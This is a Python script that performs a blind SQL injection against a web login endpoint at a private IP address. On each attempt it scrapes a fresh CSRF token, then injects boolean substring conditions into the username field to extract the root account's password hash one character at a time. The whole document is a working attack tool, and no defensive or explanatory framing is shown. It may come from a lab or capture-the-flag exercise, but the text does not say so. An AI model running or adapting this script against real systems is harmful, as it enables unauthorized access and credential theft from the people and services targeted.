import re

from requests import post, get

"""admin' and ascii(mid(password,1,1))=47  and '1'='1
"""
host = 'http://192.168.99.227:5000'

url = host + '/v1/login'
letter = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/='
passwd_len_max = 24
data = {'user': '', 'password': 'helloworld1', 'csrf': ''}
print("Sql inject processing:")
csrf_pattern = r'<input type="hidden" value="([0-9a-z\-]+)" id="CSRF">'
for i in range(1, passwd_len_max + 1):
    for a in letter:
        if '/v1/' not in url:
            data['user'] = "root' and ascii(mid(password,{0},1))={1} and '1'='1".format(i, ord(a))
        else:
            data['user'] = "root' and substr(password,{0},1)=\'{1}\' and '1'='1".format(i, a)
        src = get(host)
        csrf = re.findall(csrf_pattern, src.text)
        if csrf is None:
            print('Can Not obtain the CSRF Token!')
            exit(1)
        else:
            # print("CSRF:{}".format(csrf[0]))
            data['csrf'] = csrf[0]
        html = post(url, data)
        if 'password' in html.text:
            print(a, end='', flush=True)
        if 'CSRF' in html.text:
            print('CSRF Protect!')
            exit(0)
print('\nHash is base64(md5(password)) format!')
